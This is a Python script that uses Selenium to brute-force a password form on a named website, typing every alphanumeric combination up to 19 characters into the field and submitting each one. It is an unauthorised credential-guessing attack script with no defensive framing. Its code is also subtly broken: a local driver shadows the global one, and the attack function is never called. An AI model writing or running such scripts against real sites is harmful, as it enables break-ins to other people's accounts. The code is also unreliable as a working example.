import platform
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import itertools
import time
from tkinter import Tk

driver = webdriver.Chrome("windows/chromedriver.exe")
input_panel, button_panel = None, None

keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
        'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

root = Tk()

width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.overrideredirect(True)

root.geometry("400x400+" + str((width - 400) // 2) + '+' + str(height - 400))

root.resizable(False, False)


def init():
    global input_panel, button_panel
    if platform.system() == "Windows":
        driver = webdriver.Chrome("windows/chromedriver.exe")
    else:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    url = "https://www.evolauto.com/"
    driver.get(url)
    time.sleep(1)

    xpath_input = '//*[@id="password"]'
    xpath_button = '/html/body/form/button'
    input_panel = driver.find_element(by=By.XPATH, value=xpath_input)
    button_panel = driver.find_element(by=By.XPATH, value=xpath_button)


def brake():
    global input_panel, button_panel
    while True:
        for r in range(1, 20):
            for i in itertools.product(keys, repeat=r):
                password = ''.join(i)
                print(password)
                input_panel.clear()
                input_panel.send_keys(password)
                button_panel.click()
                time.sleep(0.02)
                driver.switch_to.alert.accept()
